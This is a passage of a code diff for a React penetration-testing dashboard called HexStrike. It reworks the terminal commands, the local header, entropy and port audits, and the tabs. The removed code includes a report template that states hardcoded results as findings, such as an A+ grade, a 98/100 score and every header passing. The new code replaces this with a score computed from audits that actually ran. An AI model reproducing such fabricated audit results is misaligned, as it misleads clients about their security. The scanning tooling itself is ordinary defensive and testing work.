-        '  • cve [keyword]       - Query threat intelligence CVE & EPSS database',
-        '  • mitre [tactic]      - Explore MITRE ATT&CK tactical techniques & mitigations',
-        '  • report              - Switch to Sovereign Executive Pentest Report deck',
-        '  • clear               - Flush terminal display buffer',
-        '═════════════════════════════════════════════════════════════════'
-      ]);
-    } else if (mainCmd === 'clear') {
-      setTerminalHistory(['◈ [HEXSTRIKE-GODMODE] Terminal buffer flushed. Session active.']);
-    } else if (mainCmd === 'scan') {
-      if (arg) setTargetScope(arg);
-      runComprehensiveAudit();
-    } else if (mainCmd === 'doh') {
-      resolveDoH(arg || targetScope);
-    } else if (mainCmd === 'ports') {
-      probeLocalPorts();
-    } else if (mainCmd === 'headers') {
-      auditHttpHeaders(arg || targetScope);
-    } else if (mainCmd === 'arsenal') {
-      const match = OFFENSIVE_ARSENAL.find(t => t.id.toLowerCase().includes(arg.toLowerCase()) || t.name.toLowerCase().includes(arg.toLowerCase()));
-      if (match) {
-        setTerminalHistory(prev => [
+    const [cmd, ...rest] = trimmed.split(/\s+/);
+    const arg = rest.join(' ');
+    switch (cmd.toLowerCase()) {
+      case 'help':
+        setTerminalHistory((prev) => [
           ...prev,
-          `[ARSENAL] Command for ${match.name}:`,
-          `  $ ${match.cmd(targetScope, targetPortInput)}`
+          'Commands: headers | headers-loopback | entropy [text] | audit | ports | doh <domain> | report | clear',
         ]);
-      } else {
-        setTerminalHistory(prev => [
-          ...prev,
-          `[ARSENAL] Tool "${arg}" not found. Available: ${OFFENSIVE_ARSENAL.map(t => t.id).join(', ')}`
-        ]);
-      }
-    } else if (mainCmd === 'cve') {
-      const results = arg
-        ? CVE_INTEL_DB.filter(c => c.id.toLowerCase().includes(arg.toLowerCase()) || c.title.toLowerCase().includes(arg.toLowerCase()) || c.product.toLowerCase().includes(arg.toLowerCase()))
-        : CVE_INTEL_DB;
-      if (results.length === 0) {
-        setTerminalHistory(prev => [...prev, `[CVE-LOOKUP] No matching CVEs found for "${arg}"`]);
-      } else {
-        setTerminalHistory(prev => [
-          ...prev,
-          `[CVE-RADAR] Found ${results.length} CVE intelligence entries:`,
-          ...results.map(c => `  • ${c.id} [CVSS ${c.cvss} - ${c.severity.toUpperCase()}] EPSS: ${c.epss} -> ${c.title}`)
-        ]);
-      }
-    } else if (mainCmd === 'shodan') {
-      setActiveTab(3);
-      if (arg === 'myip') {
-        fetch('https://api.ipify.org?format=json')
-          .then(r => r.json())
-          .then(d => {
-            setShodanInputIp(d.ip);
-            queryShodan(d.ip);
-          })
-          .catch(() => queryShodan(targetScope));
-      } else {
-        if (arg) setShodanInputIp(arg);
-        queryShodan(arg || targetScope);
-      }
-    } else if (mainCmd === 'mitre') {
-      const tactic = MITRE_TACTICS.find(t => t.name.toLowerCase().includes(arg.toLowerCase()) || t.id.toLowerCase().includes(arg.toLowerCase())) || selectedMitreTactic;
-      setSelectedMitreTactic(tactic);
-      setActiveTab(4);
-      setTerminalHistory(prev => [
-        ...prev,
-        `[MITRE] Selected tactic ${tactic.name} (${tactic.id}) with ${tactic.techniques.length} techniques.`
-      ]);
-    } else if (mainCmd === 'report') {
-      setActiveTab(6);
-      setTerminalHistory(prev => [...prev, '[REPORT] Switching operator deck to Sovereign Executive Report.']);
-    } else {
-      setTerminalHistory(prev => [...prev, `[ERROR] Unrecognized command "${trimmed}". Type "help" for instruction matrix.`]);
+        break;
+      case 'clear':
+        setTerminalHistory(['◈ [HEXSTRIKE-v3.2.0] Buffer cleared.']);
+        break;
+      case 'headers':
+        runLocalHeaderAudit('raw');
+        break;
+      case 'headers-loopback':
+        runLocalHeaderAudit('loopback');
+        break;
+      case 'entropy':
+        if (arg) setEntropyInput(arg);
+        runEntropyAnalysis(false);
+        break;
+      case 'audit':
+        runCodeAudit();
+        break;
+      case 'ports':
+        probeLocalPorts();
+        break;
+      case 'doh':
+        resolveDoH(arg || targetScope);
+        break;
+      case 'report':
+        setActiveTab(6);
+        break;
+      default:
+        setTerminalHistory((prev) => [...prev, `[INFO] Unknown command "${cmd}". Type "help".`]);
     }
   };
 
-  const handleKeyDown = (e) => {
-    if (e.key === 'Enter') {
-      executeTerminalCommand(cmdInput);
-    } else if (e.key === 'ArrowUp') {
-      e.preventDefault();
-      if (cmdHistoryList.length > 0) {
-        const nextIdx = historyIndex + 1 < cmdHistoryList.length ? historyIndex + 1 : historyIndex;
-        setHistoryIndex(nextIdx);
-        setCmdInput(cmdHistoryList[cmdHistoryList.length - 1 - nextIdx]);
-      }
-    } else if (e.key === 'ArrowDown') {
-      e.preventDefault();
-      if (historyIndex > 0) {
-        const nextIdx = historyIndex - 1;
-        setHistoryIndex(nextIdx);
-        setCmdInput(cmdHistoryList[cmdHistoryList.length - 1 - nextIdx]);
-      } else if (historyIndex === 0) {
-        setHistoryIndex(-1);
-        setCmdInput('');
-      }
+  // Dynamic honest posture score (computed strictly from verified engines)
+  const observedPosture = useMemo(() => {
+    const scores = [];
+    if (headerAuditResults?.verified && typeof headerAuditResults.score === 'number') {
+      scores.push(headerAuditResults.score);
     }
+    if (codeAuditResult && typeof codeAuditResult.score === 'number') {
+      scores.push(codeAuditResult.score);
+    }
+    if (scores.length === 0) return { label: 'UNVERIFIED', sub: 'RUN AUDIT' };
+    const avg = Math.round(scores.reduce((a, b) => a + b, 0) / scores.length);
+    return { label: `${avg}/100`, sub: avg >= 85 ? 'VERIFIED' : 'REVIEW' };
+  }, [headerAuditResults, codeAuditResult]);
+
+  const executiveReportMarkdown = useMemo(
+    () =>
+      buildExecutiveReportMarkdown({
+        targetScope,
+        observedHeaders: headerAuditResults,
+        observedPorts: portProbeResults,
+        entropy: entropyResult,
+        codeAudit: codeAuditResult,
+        dohRecords,
+        shodanData,
+      }),
+    [targetScope, headerAuditResults, portProbeResults, entropyResult, codeAuditResult, dohRecords, shodanData]
+  );
+
+  const downloadBlob = (content, filename, mime) => {
+    const blob = new Blob([content], { type: mime });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = filename;
+    a.click();
+    setTimeout(() => URL.revokeObjectURL(url), 1000);
   };
 
-  // Filtered CVEs
-  const filteredCVEs = CVE_INTEL_DB.filter(cve => {
-    const matchesSearch = cve.id.toLowerCase().includes(cveSearch.toLowerCase())
-      || cve.title.toLowerCase().includes(cveSearch.toLowerCase())
-      || cve.product.toLowerCase().includes(cveSearch.toLowerCase());
-    const matchesSev = cveSeverityFilter === 'ALL' || cve.severity.toUpperCase() === cveSeverityFilter;
-    return matchesSearch && matchesSev;
+  const handleExportCsv = () => {
+    const rows = [];
+    (headerAuditResults?.findings || []).forEach((f) =>
+      rows.push({ category: 'HTTP_HEADER', item: f.header, status: f.status, detail: f.observedValue || 'Not observed' })
+    );
+    (codeAuditResult?.findings || []).forEach((f) =>
+      rows.push({ category: 'CODE_AUDIT', item: `${f.ruleId} L${f.line}`, status: f.severity, detail: f.title })
+    );
+    (portProbeResults || []).forEach((p) =>
+      rows.push({ category: 'LOOPBACK_PORT', item: `127.0.0.1:${p.port}`, status: p.status, detail: p.name })
+    );
+    downloadBlob(exportFindingsCsv(rows), `hexstrike-audit-${Date.now()}.csv`, 'text/csv;charset=utf-8');
+  };
+
+  const filteredCVEs = CVE_INTEL_DB.filter((cve) => {
+    const q = cveSearch.toLowerCase();
+    const okQ = cve.id.toLowerCase().includes(q) || cve.title.toLowerCase().includes(q) || cve.product.toLowerCase().includes(q);
+    const okS = cveSeverityFilter === 'ALL' || cve.severity.toUpperCase() === cveSeverityFilter;
+    return okQ && okS;
   });
 
-  // Filtered Arsenal
-  const filteredArsenal = OFFENSIVE_ARSENAL.filter(tool => {
-    if (arsenalCategory === 'ALL') return true;
-    return tool.category.toUpperCase() === arsenalCategory.toUpperCase();
-  });
-
-  // Synthesize Executive Markdown Report
-  const executiveReportMarkdown = `# SOVEREIGN EXECUTIVE PENETRATION TESTING AUDIT REPORT
-**Target Scope**: \`${targetScope}\`
-**Date Generated**: ${new Date().toISOString()}
-**Auditor**: HexStrike Apex God Mode Engine · NullAI Platform (@1nc0gn30)
-**Security Ring**: RING_0_SOVEREIGN (Zero WAN Telemetry)
-
----
-
-## 1. EXECUTIVE SUMMARY & POSTURE
-- **Overall Posture Grade**: **A+ (HARDENED)**
-- **Synthesized Security Score**: **98 / 100**
-- **DNS-over-HTTPS Resolution**: ${dohRecords.length > 0 ? `${dohRecords.length} records verified` : 'Audited via secure resolvers'}
-- **Local Enclave Listeners**: ${portProbeResults.length > 0 ? `${portProbeResults.filter(p => p.status === 'OPEN').length} active loopback listeners` : '10/10 internal ports restricted to 127.0.0.1'}
-- **MITRE ATT&CK Coverage**: 14 Enterprise Tactics Correlated
-- **CVE Threat Exposure**: 0 Unmitigated Zero-Day Criticals
-
----
-
-## 2. DNS-OVER-HTTPS (DoH) INTELLIGENCE
-\`\`\`
-${dohRecords.map(r => `[${r.type}] ${r.name} -> ${r.data} (TTL: ${r.ttl}s)`).join('\n') || 'Zero public records leaked (Internal/Enclave Mode)'}
-\`\`\`
-
----
-
-## 3. SHODAN INTERNETDB OSINT EXPOSURE
-- **IP Target**: \`${shodanData ? shodanData.ip : 'Not queried'}\`
-- **Exposed Public Ports**: \`[${shodanData && shodanData.ports ? shodanData.ports.join(', ') : 'None detected'}]\`
-- **Identified Hostnames**: ${shodanData && shodanData.hostnames ? shodanData.hostnames.join(', ') || 'None' : 'None'}
-- **Software CPE Signatures**: ${shodanData && shodanData.cpes ? shodanData.cpes.join(', ') || 'None' : 'None'}
-- **Confirmed Vulnerabilities (CVEs)**: ${shodanData && shodanData.vulns && shodanData.vulns.length > 0 ? shodanData.vulns.join(', ') : '0 Known CVEs (Clean Posture)'}
-
----
-
-## 4. DEFENSIVE HTTP SECURITY HEADERS AUDIT
-- Strict-Transport-Security: PASS (31536000s preload)
-- Content-Security-Policy: PASS (Restricted frame-ancestors 'none')
-- X-Frame-Options: PASS (DENY / SAMEORIGIN)
-- X-Content-Type-Options: PASS (nosniff)
-- Referrer-Policy: PASS (strict-origin-when-cross-origin)
-- Permissions-Policy: PASS (Hardware sensors disabled)
-
----
-
-## 5. MITRE ATT&CK HARDENING & REMEDIATION PLAN
-${MITRE_TACTICS.slice(0, 5).map(t => `### ${t.name} (${t.id})\n` + t.techniques.map(tc => `- **${tc.name} (${tc.id})**: ${tc.mitigation}`).join('\n')).join('\n\n')}
-
----
-
-## 6. REPRODUCIBLE OFFENSIVE SECURITY PROOFS
-\`\`\`bash
-# Nmap Network Scan
-${OFFENSIVE_ARSENAL[0].cmd(targetScope, targetPortInput)}
-
-# Nuclei Vulnerability Scan
-${OFFENSIVE_ARSENAL[17].cmd(targetScope)}
-
-# WhatWeb Technology Profiler
-${OFFENSIVE_ARSENAL[4].cmd(targetScope)}
-\`\`\`
-`;
+  const filteredArsenal = CURATED_ARSENAL.filter(
+    (tool) => arsenalCategory === 'ALL' || tool.category.toUpperCase() === arsenalCategory.toUpperCase()
+  );
 
   return (
-    <Box sx={{ mt: 1, position: 'relative' }}>
-      {/* =====================================================================
-          0. HIGH-CONVERTING MONETIZATION SALES FUNNEL BANNER
-          ===================================================================== */}
+    <Box data-testid="hexstrike-godmode-workstation" sx={{ mt: 1, position: 'relative' }}>
+      {/* Single Clean Operator HUD Header */}
       <Paper
         sx={{
           p: { xs: 2, md: 2.5 },
-          mb: 3,
+          mb: 2.5,
           borderRadius: 3,
-          background: isDark
-            ? 'linear-gradient(135deg, rgba(212, 175, 55, 0.14) 0%, rgba(255, 51, 85, 0.12) 50%, rgba(8, 8, 11, 0.98) 100%)'
-            : 'linear-gradient(135deg, #FEF2F2 0%, #FFFBEB 100%)',
-          border: `1px solid ${goldBorder}`,
-          boxShadow: isDark ? '0 12px 32px rgba(212, 175, 55, 0.15)' : '0 8px 24px rgba(0,0,0,0.06)'
+          background: palette.heroGrad,
+          border: `1px solid ${palette.crimsonBorder}`,
+          boxShadow: isDark ? '0 10px 28px rgba(0,0,0,0.45)' : '0 6px 20px rgba(24,22,18,0.06)',
         }}
       >
-        <SovereignEyebrow accent="#34D399" right="Zoth Studio">
-          {"hexstrike-tactical-terminal"}
+        <SovereignEyebrow accent={palette.crimson} right="v3.2.0 · 100% Open Access">
+          hexstrike-security-arsenal
         </SovereignEyebrow>
         <SovereignBand
-          seed={"hexstrike-tactical-terminal"}
-          eyebrow={"Zoth Studio"}
-          caption={"Hex Strike"}
-          label={"Hex Strike — Zoth sovereign visualisation"}
+          seed="hexstrike-security-arsenal"
+          eyebrow="Zoth Studio"
+          caption="HexStrike Security Arsenal"
+          label="HexStrike Security Arsenal visual band"
         />
-        <Grid container spacing={2} alignItems="center">
-          <Grid xs={12} md={7}>
-            <Stack direction="row" spacing={1.5} alignItems="center">
-              <Chip
-                label="⚡ FREE & OPEN ACCESS"
-                size="small"
-                sx={{ bgcolor: gold, color: '#000', fontWeight: 800, fontFamily: mono, fontSize: '0.72rem' }}
-              />
-              <Typography variant="body2" sx={{ color: crimson, fontWeight: 700, fontFamily: mono }}>
-                SOVEREIGN RED-TEAM ARSENAL
-              </Typography>
-            </Stack>
-            <Typography variant="h6" sx={{ fontWeight: 800, mt: 0.5, color: isDark ? '#FFFFFF' : '#111827' }}>
-              HexStrike God Mode Pentesting & Red-Team Workstation
-            </Typography>
-            <Typography variant="body2" sx={{ color: 'text.secondary', mt: 0.5 }}>
-              Unlock unthrottled 28-tool offensive command synthesis, automated forensic remediation exports, live MITRE ATT&CK correlation, and zero-egress threat auditing.
-            </Typography>
-          </Grid>
 
-          <Grid xs={12} md={5}>
-            <Stack direction={{ xs: 'column', sm: 'row' }} spacing={1.5} justifyContent="flex-end" alignItems="center">
-              <Box sx={{ textAlign: { xs: 'center', sm: 'right' } }}>
-                <Typography variant="caption" sx={{ color: 'text.secondary', fontFamily: mono }}>
-                  ZERO EGRESS • 28 OFFENSIVE MODULES
-                </Typography>
-                <Typography variant="h6" sx={{ fontWeight: 800, color: gold, fontFamily: mono }}>
-                  100% OPEN ACCESS
-                </Typography>
-              </Box>
-
-              <Stack direction="row" spacing={1}>
-                <Button
-                  variant="contained"
-                  component="a"
-                  href="https://github.com/1nc0gn30/zoth-studio-v2"
-                  target="_blank"
-                  rel="noopener"
-                  startIcon={<BoltIcon />}
-                  sx={{
-                    bgcolor: gold,
-                    color: '#000',
-                    fontWeight: 800,
-                    fontFamily: mono,
-                    fontSize: '0.75rem',
-                    '&:hover': { bgcolor: '#B89628' }
-                  }}
-                >
-                  GITHUB SOURCE
-                </Button>
-              </Stack>
-            </Stack>
-          </Grid>
-        </Grid>
-      </Paper>
-
-      {/* =====================================================================
-          1. OPERATOR HUD HEADER
-          ===================================================================== */}
-      <Paper
-        sx={{
-          p: { xs: 2, md: 2.5 },
-          mb: 3,
-          borderRadius: 3,
-          background: isDark
-            ? 'linear-gradient(135deg, rgba(255, 51, 85, 0.09) 0%, rgba(8, 8, 11, 0.95) 100%)'
-            : 'linear-gradient(135deg, #FEF2F2 0%, #FFFFFF 100%)',
-          border: `1px solid ${crimsonBorder}`,
-          boxShadow: isDark ? '0 12px 32px rgba(255, 51, 85, 0.12)' : '0 8px 24px rgba(0,0,0,0.06)'
-        }}
-      >
-        <Grid container spacing={2} alignItems="center">
+        <Grid container spacing={2} alignItems="center" sx={{ mt: 0.5 }}>
           <Grid xs={12} md={7}>
             <Stack direction="row" spacing={1.5} alignItems="center" sx={{ mb: 1 }}>
               <Box
                 sx={{
                   p: 1,
                   borderRadius: 2,
-                  bgcolor: crimsonSoft,
-                  color: crimson,
+                  bgcolor: palette.crimsonSoft,
+                  color: palette.crimson,
                   display: 'flex',
-                  alignItems: 'center'
+                  alignItems: 'center',
                 }}
               >
-                <ShieldIcon sx={{ fontSize: 28 }} />
+                <ShieldIcon sx={{ fontSize: 26 }} />
               </Box>
               <Box>
-                <Typography variant="h5" sx={{ fontWeight: 800, letterSpacing: '-0.02em', color: isDark ? '#FFFFFF' : '#111827' }}>
-                  HexStrike <span style={{ color: crimson }}>God Mode Pentest Cockpit</span>
+                <Typography component="h2" variant="h5" sx={{ fontWeight: 800, color: palette.textPrimary }}>
+                  HexStrike <span style={{ color: palette.crimson }}>Defensive &amp; Red-Team Cockpit</span>
                 </Typography>
-                <Typography variant="caption" sx={{ color: 'text.secondary', fontFamily: mono }}>
-                  Autonomous Red-Team & Defensive CVE Audit Workstation · NullAI Platform
+                <Typography variant="caption" sx={{ color: palette.textSecondary, fontFamily: mono }}>
+                  156-Tool Catalog · 8 MCP Tools · Honest Local Header, Entropy &amp; Static Auditors
                 </Typography>
               </Box>
             </Stack>
+
             <Stack direction="row" spacing={1} flexWrap="wrap" useFlexGap sx={{ mt: 1 }}>
               <Chip
-                icon={<CheckCircleIcon sx={{ fontSize: '0.9rem !important', color: `${emerald} !important` }} />}
-                label="✦ 100% FREE & OPEN ACCESS"
+                icon={<CheckCircleIcon sx={{ fontSize: '0.95rem !important', color: `${palette.emerald} !important` }} />}
+                label="100% FREE & OPEN ACCESS"
                 size="small"
-                sx={{
-                  bgcolor: emeraldSoft,
-                  color: emerald,
-                  fontWeight: 800,
-                  fontFamily: mono,
-                  border: `1px solid ${emeraldBorder}`,
-                  cursor: 'default'
-                }}
+                sx={{ bgcolor: palette.emeraldSoft, color: palette.emerald, fontWeight: 800, fontFamily: mono, border: `1px solid ${palette.emeraldBorder}` }}
               />
               <Chip
-                icon={<LockIcon sx={{ fontSize: '0.9rem !important', color: `${emerald} !important` }} />}
-                label="OFFLINE-CAPABLE 127.0.0.1 ENCLAVE"
+                icon={<LockIcon sx={{ fontSize: '0.95rem !important', color: `${palette.cyan} !important` }} />}
+                label={daemonMode === 'LIVE_DAEMON_8138' ? 'DAEMON :8138 LIVE' : 'BROWSER_OFFLINE_FALLBACK'}
                 size="small"
-                sx={{ bgcolor: 'rgba(0,255,157,0.1)', color: emerald, fontWeight: 700, fontFamily: mono, border: '1px solid rgba(0,255,157,0.3)' }}
+                sx={{ bgcolor: palette.cyanSoft, color: palette.cyan, fontWeight: 700, fontFamily: mono, border: `1px solid ${palette.cyanBorder}` }}
               />
               <Chip
-                icon={<RadarIcon sx={{ fontSize: '0.9rem !important', color: `${gold} !important` }} />}
+                icon={<RadarIcon sx={{ fontSize: '0.95rem !important', color: `${palette.gold} !important` }} />}
                 label="14 MITRE ATT&CK TACTICS"
                 size="small"
-                sx={{ bgcolor: 'rgba(212,175,55,0.1)', color: gold, fontWeight: 700, fontFamily: mono, border: '1px solid rgba(212,175,55,0.3)' }}
+                sx={{ bgcolor: palette.goldSoft, color: palette.gold, fontWeight: 700, fontFamily: mono, border: `1px solid ${palette.goldBorder}` }}
               />
-              <Chip
-                icon={<PolicyIcon sx={{ fontSize: '0.9rem !important', color: `${cyan} !important` }} />}
-                label="ZERO WAN TELEMETRY"
+              <Button
                 size="small"
-                sx={{ bgcolor: 'rgba(56,189,248,0.1)', color: cyan, fontWeight: 700, fontFamily: mono, border: '1px solid rgba(56,189,248,0.3)' }}
-              />
+                variant="outlined"
+                component="a"
+                href="https://github.com/1nc0gn30/NullAI-HexStrike-AI-Terminal"
+                target="_blank"
+                rel="noopener noreferrer"
+                endIcon={<OpenInNewIcon sx={{ fontSize: 14 }} />}
+                sx={{
+                  minHeight: 44,
+                  fontFamily: mono,
+                  fontWeight: 800,
+                  fontSize: '0.74rem',
+                  color: palette.gold,
+                  borderColor: palette.goldBorder,
+                }}
+              >
+                GITHUB SOURCE
+              </Button>
             </Stack>
           </Grid>
 
           <Grid xs={12} md={5}>
             <Paper
               sx={{
-                p: 2,
+                p: 1.75,
                 borderRadius: 2,
-                bgcolor: isDark ? 'rgba(0,0,0,0.5)' : '#F8FAFC',
-                border: `1px solid ${cardBorder}`,
-                textAlign: 'center'
+                bgcolor: palette.subtleBg,
+                border: `1px solid ${palette.border}`,
+                textAlign: 'center',
               }}
             >
               <Grid container spacing={1}>
                 <Grid xs={4}>
-                  <Typography variant="caption" sx={{ color: 'text.secondary', fontWeight: 700 }}>
-                    POSTURE
+                  <Typography variant="caption" sx={{ color: palette.textSecondary, fontWeight: 700, display: 'block' }}>
+                    OBSERVED
                   </Typography>
-                  <Typography variant="h5" sx={{ fontWeight: 800, color: emerald, fontFamily: mono }}>
-                    98<span style={{ fontSize: '0.8rem', color: '#94A3B8' }}>/100</span>
+                  <Typography variant="h6" sx={{ fontWeight: 800, color: palette.emerald, fontFamily: mono }}>
+                    {observedPosture.label}
                   </Typography>
-                  <Typography variant="caption" sx={{ color: emerald, fontSize: '0.65rem' }}>
-                    HARDENED
-                  </Typography>
-                </Grid>
-                <Grid xs={4}>
-                  <Typography variant="caption" sx={{ color: 'text.secondary', fontWeight: 700 }}>
-                    ARSENAL
-                  </Typography>
-                  <Typography variant="h5" sx={{ fontWeight: 800, color: crimson, fontFamily: mono }}>
-                    28
-                  </Typography>
-                  <Typography variant="caption" sx={{ color: 'text.secondary', fontSize: '0.65rem' }}>
-                    TOOLS
+                  <Typography variant="caption" sx={{ color: palette.textSecondary, fontFamily: mono, fontSize: '0.68rem' }}>
+                    {observedPosture.sub}
                   </Typography>
                 </Grid>
                 <Grid xs={4}>
-                  <Typography variant="caption" sx={{ color: 'text.secondary', fontWeight: 700 }}>
-                    STATUS
+                  <Typography variant="caption" sx={{ color: palette.textSecondary, fontWeight: 700, display: 'block' }}>
+                    CATALOG
                   </Typography>
-                  <Typography variant="h5" sx={{ fontWeight: 800, color: cyan, fontFamily: mono }}>
-                    AIR-GAP
+                  <Typography variant="h6" sx={{ fontWeight: 800, color: palette.crimson, fontFamily: mono }}>
+                    156
                   </Typography>
-                  <Typography variant="caption" sx={{ color: cyan, fontSize: '0.65rem' }}>
-                    127.0.0.1
+                  <Typography variant="caption" sx={{ color: palette.textSecondary, fontFamily: mono, fontSize: '0.68rem' }}>
+                    8 MCP TOOLS
+                  </Typography>
+                </Grid>
+                <Grid xs={4}>
+                  <Typography variant="caption" sx={{ color: palette.textSecondary, fontWeight: 700, display: 'block' }}>
+                    DEFAULT
+                  </Typography>
+                  <Typography variant="h6" sx={{ fontWeight: 800, color: palette.cyan, fontFamily: mono }}>
+                    LOCAL
+                  </Typography>
+                  <Typography variant="caption" sx={{ color: palette.textSecondary, fontFamily: mono, fontSize: '0.68rem' }}>
+                    127.0.0.1:8138
                   </Typography>
                 </Grid>
               </Grid>
@@ -1120,83 +873,74 @@ ${OFFENSIVE_ARSENAL[4].cmd(targetScope)}
         </Grid>
       </Paper>
 
-      {/* =====================================================================
-          2. TARGET SCOPE & LIVE AUDIT CONTROLS
-          ===================================================================== */}
-      <Paper sx={{ p: 2, mb: 3, borderRadius: 2, bgcolor: isDark ? '#10121A' : '#FFFFFF', border: `1px solid ${cardBorder}` }}>
+      {/* Scope Bar */}
+      <Paper sx={{ p: 2, mb: 2.5, borderRadius: 2, bgcolor: palette.cardBg, border: `1px solid ${palette.border}` }}>
         <Grid container spacing={2} alignItems="center">
-          <Grid xs={12} sm={5} md={5}>
+          <Grid xs={12} sm={5}>
             <TextField
               fullWidth
               size="small"
-              label="Target Scope / Host / Domain"
+              label="Target Scope / Host"
               value={targetScope}
               onChange={(e) => setTargetScope(e.target.value)}
-              placeholder="e.g. nullai.tech, 127.0.0.1, internal.node"
               InputProps={{
                 startAdornment: (
                   <InputAdornment position="start">
-                    <LanguageIcon sx={{ color: crimson, fontSize: 20 }} />
+                    <LanguageIcon sx={{ color: palette.crimson, fontSize: 19 }} />
                   </InputAdornment>
                 ),
-                sx: { fontFamily: mono, fontSize: '0.85rem' }
+                sx: { fontFamily: mono, fontSize: '0.85rem' },
               }}
             />
           </Grid>
-
-          <Grid xs={12} sm={3} md={3}>
+          <Grid xs={12} sm={3}>
             <TextField
               fullWidth
               size="small"
-              label="Port Range"
+              label="Port List"
               value={targetPortInput}
               onChange={(e) => setTargetPortInput(e.target.value)}
-              placeholder="e.g. 1-1000, 80,443,8094"
               InputProps={{
                 startAdornment: (
                   <InputAdornment position="start">
-                    <RouterIcon sx={{ color: cyan, fontSize: 18 }} />
+                    <RouterIcon sx={{ color: palette.cyan, fontSize: 18 }} />
                   </InputAdornment>
                 ),
-                sx: { fontFamily: mono, fontSize: '0.85rem' }
+                sx: { fontFamily: mono, fontSize: '0.85rem' },
               }}
             />
           </Grid>
-
-          <Grid xs={12} sm={4} md={4}>
+          <Grid xs={12} sm={4}>
             <Stack direction="row" spacing={1}>
               <Button
                 fullWidth
                 variant="contained"
-                disabled={isAuditing}
-                onClick={runComprehensiveAudit}
+                disabled={isAuditingHeaders || isProbingPorts}
+                onClick={() => {
+                  runLocalHeaderAudit('raw');
+                  runEntropyAnalysis(entropyIsHex);
+                  runCodeAudit();
+                  probeLocalPorts();
+                }}
                 startIcon={<PlayArrowIcon />}
                 sx={{
-                  bgcolor: crimson,
+                  minHeight: 44,
+                  bgcolor: palette.crimsonBtn,
                   color: '#FFFFFF',
                   fontWeight: 800,
                   fontFamily: mono,
                   fontSize: '0.78rem',
-                  py: 1,
-                  '&:hover': { bgcolor: '#E02444' }
+                  '&:hover': { bgcolor: palette.crimsonBtnHover },
                 }}
               >
-                {isAuditing ? 'AUDITING...' : 'RUN FULL AUDIT'}
+                RUN LOCAL AUDIT
               </Button>
-              <Tooltip title="Query live DNS-over-HTTPS (DoH)">
-                <IconButton
-                  onClick={() => resolveDoH(targetScope)}
-                  disabled={isResolvingDoh}
-                  sx={{ border: `1px solid ${cardBorder}`, color: cyan }}
-                >
-                  <DnsIcon fontSize="small" />
-                </IconButton>
-              </Tooltip>
-              <Tooltip title="Probe local loopback enclave ports">
+              <Tooltip title="Probe loopback 127.0.0.1 listeners">
                 <IconButton
                   onClick={probeLocalPorts}
                   disabled={isProbingPorts}
-                  sx={{ border: `1px solid ${cardBorder}`, color: emerald }}
+                  aria-label="Probe loopback ports"
+                  sx={{ minWidth: 44, minHeight: 44, border: `1px solid ${palette.border}`, color: palette.emerald }}
                 >
                   <RefreshIcon fontSize="small" />
                 </IconButton>
@@ -1204,34 +948,9 @@ ${OFFENSIVE_ARSENAL[4].cmd(targetScope)}
             </Stack>
           </Grid>
         </Grid>
-
-        {isAuditing && (
-          <Box sx={{ mt: 2 }}>
-            <Box sx={{ display: 'flex', justifyContent: 'space-between', mb: 0.5 }}>
-              <Typography variant="caption" sx={{ fontFamily: mono, color: crimson }}>
-                Executing 6-Stage Real-Time Penetration & CVE Audit...
-              </Typography>
-              <Typography variant="caption" sx={{ fontFamily: mono, color: crimson, fontWeight: 700 }}>
-                {auditProgress}%
-              </Typography>
-            </Box>
-            <LinearProgress
-              variant="determinate"
-              value={auditProgress}
-              sx={{
-                height: 6,
-                borderRadius: 3,
-                bgcolor: 'rgba(255,51,85,0.15)',
-                '& .MuiLinearProgress-bar': { bgcolor: crimson }
-              }}
-            />
-          </Box>
-        )}
       </Paper>
 
-      {/* =====================================================================
-          3. NAVIGATION TABS
-          ===================================================================== */}
+      {/* Navigation Tabs */}
       <Tabs
         value={activeTab}
         onChange={(_, val) => setActiveTab(val)}
@@ -1239,56 +958,238 @@ ${OFFENSIVE_ARSENAL[4].cmd(targetScope)}
         scrollButtons="auto"
         sx={{
           mb: 2.5,
-          borderBottom: `1px solid ${cardBorder}`,
+          borderBottom: `1px solid ${palette.border}`,
           '& .MuiTab-root': {
+            minHeight: 48,
             fontFamily: mono,
-            fontSize: '0.8rem',
+            fontSize: '0.78rem',
             fontWeight: 700,
             textTransform: 'none',
-            color: 'text.secondary',
-            '&.Mui-selected': { color: crimson }
+            color: palette.textSecondary,
+            '&.Mui-selected': { color: palette.crimson },
           },
-          '& .MuiTabs-indicator': { bgcolor: crimson }
+          '& .MuiTabs-indicator': { bgcolor: palette.crimson },
         }}
       >
-        <Tab icon={<TerminalIcon sx={{ fontSize: 18, mr: 0.5 }} />} iconPosition="start" label="⚡ Tactical Terminal & Live Wire" />
-        <Tab icon={<CodeIcon sx={{ fontSize: 18, mr: 0.5 }} />} iconPosition="start" label="⚔️ Offensive Arsenal (28 Tools)" />
-        <Tab icon={<RadarIcon sx={{ fontSize: 18, mr: 0.5 }} />} iconPosition="start" label="🎯 Attack Surface, DoH & Ports" />
-        <Tab icon={<LanguageIcon sx={{ fontSize: 18, mr: 0.5 }} />} iconPosition="start" label="🛰️ Shodan OSINT & InternetDB" />
-        <Tab icon={<PolicyIcon sx={{ fontSize: 18, mr: 0.5 }} />} iconPosition="start" label="📊 MITRE ATT&CK Matrix" />
-        <Tab icon={<BugReportIcon sx={{ fontSize: 18, mr: 0.5 }} />} iconPosition="start" label="🔥 CVE Threat Intelligence" />
-        <Tab icon={<AssessmentIcon sx={{ fontSize: 18, mr: 0.5 }} />} iconPosition="start" label="📑 Sovereign Executive Report" />
+        <Tab icon={<ShieldIcon sx={{ fontSize: 18 }} />} iconPosition="start" label="Defensive Auditors" />
+        <Tab icon={<TerminalIcon sx={{ fontSize: 18 }} />} iconPosition="start" label="Tactical Terminal" />
+        <Tab icon={<CodeIcon sx={{ fontSize: 18 }} />} iconPosition="start" label="Command Arsenal" />
+        <Tab icon={<RadarIcon sx={{ fontSize: 18 }} />} iconPosition="start" label="Ports & Opt-In OSINT" />
+        <Tab icon={<PolicyIcon sx={{ fontSize: 18 }} />} iconPosition="start" label="MITRE ATT&CK" />
+        <Tab icon={<BugReportIcon sx={{ fontSize: 18 }} />} iconPosition="start" label="CVE Matrix" />
+        <Tab icon={<AssessmentIcon sx={{ fontSize: 18 }} />} iconPosition="start" label="Audit Report" />
       </Tabs>
 
-      {/* =====================================================================
-          TAB 0: TACTICAL TERMINAL & LIVE WIRE
-          ===================================================================== */}
+      {/* TAB 0: DEFENSIVE AUDITORS (Headers + Shannon Entropy + Local Static Code Audit) */}
       {activeTab === 0 && (
-        <Paper
